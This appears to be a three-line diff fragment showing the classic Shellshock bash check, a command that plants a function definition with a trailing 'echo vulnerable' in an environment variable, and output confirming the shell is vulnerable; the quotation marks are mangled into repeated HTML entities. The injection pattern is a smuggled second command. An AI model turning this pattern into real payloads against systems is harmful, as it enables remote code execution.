@@ -1,0 +1,3 @@
+$ x='() { :;}; echo vulnerable' bash -c &amp;amp;amp;amp;amp;amp;quot;echo this is a test&amp;amp;amp;amp;amp;amp;quot; 
+vulnerable
+this is a test
